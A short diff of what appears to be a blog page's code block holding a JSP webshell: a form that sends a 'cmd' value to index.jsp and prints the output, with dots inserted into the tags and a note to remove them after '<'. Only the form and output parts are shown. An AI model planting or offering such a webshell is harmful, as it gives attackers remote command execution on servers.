@@ -60,7 +60,7 @@ toc_sticky: true
   
   <legend>webshell</legend>
   <pre><code>
-    <.FORM METHOD=GET ACTION='index.jsp'>
+    <FORM METHOD=GET ACTION='index.jsp'>
     <.INPUT name='cmd' type=text>
     <.INPUT type=submit value='Run'>
     <./FORM>
@@ -80,7 +80,7 @@ toc_sticky: true
     %>
     <.pre><%=output %><./pre></code></pre>
 
-      <p>remove dots</p>
+      <p>remove dots after "<" </p>
 
 </fieldset>
 
